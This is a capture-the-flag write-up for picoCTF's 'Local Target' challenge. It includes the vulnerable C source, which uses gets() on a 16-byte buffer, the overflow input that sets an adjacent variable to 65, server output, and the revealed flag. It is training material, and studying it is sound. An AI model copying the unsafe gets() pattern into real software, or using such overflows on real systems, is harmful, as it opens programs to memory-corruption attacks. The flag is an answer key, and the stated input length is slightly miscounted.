### Local Target

Author: OverTheWire.org / LT 'syreal' Jones
#Medium #Binary_exploitation #picoGym #gets
#### Description

Smash the stack Can you overflow the buffer and modify the other local variable? The program is available [here](https://artifacts.picoctf.net/c/517/local-target). You can view source [here](https://artifacts.picoctf.net/c/517/local-target.c). And connect with it using: `nc saturn.picoctf.net 50420`

##### Solution:
```c
#include <stdio.h>
#include <stdlib.h>

int main() {
    FILE *fptr;
    char c;

    char input[16];
    int num = 64;

    printf("Enter a string: ");
    fflush(stdout);
    gets(input);
    printf("\n");

    printf("num is %d\n", num);
    fflush(stdout);

    if (num == 65) {
        printf("You win!\n");
        fflush(stdout);
        // Open file
        fptr = fopen("flag.txt", "r");
        if (fptr == NULL) {
            printf("Cannot open file.\n");
            fflush(stdout);
            exit(0);
        }

        // Read contents from file
        c = fgetc(fptr);
        while (c != EOF) {
            printf("%c", c);
            c = fgetc(fptr);
        }
        fflush(stdout);

        printf("\n");
        fflush(stdout);
        fclose(fptr);
        exit(0);
    }

    printf("Bye!\n");
    fflush(stdout);
}

```

when you try to run enter string AAAAAAAAAAAAAAAA with 16 length
```css
./exploit_program 
Enter a string: AAAAAAAAAAAAAAAA   

num is 64
Bye!
```
but you need 65 `if (num == 65)`
AAAAAAAAAAAAAAAAAAAAAAAAA this is 26 length character
```css
./local-target 
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
pico you win
```
my flag.txt is `pico you win`
now test on server
```css
nc saturn.picoctf.net 50420
Enter a string: 111111111111111111111111A

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```
or
```css
nc saturn.picoctf.net 50420
Enter a string: AAAAAAAAAAAAAAAAAAAAAAAAA

num is 65
You win!
picoCTF{l0c4l5_1n_5c0p3_fee8ef05}
```

at the end A must be added so that it will print 65 Because ascii value of A is 65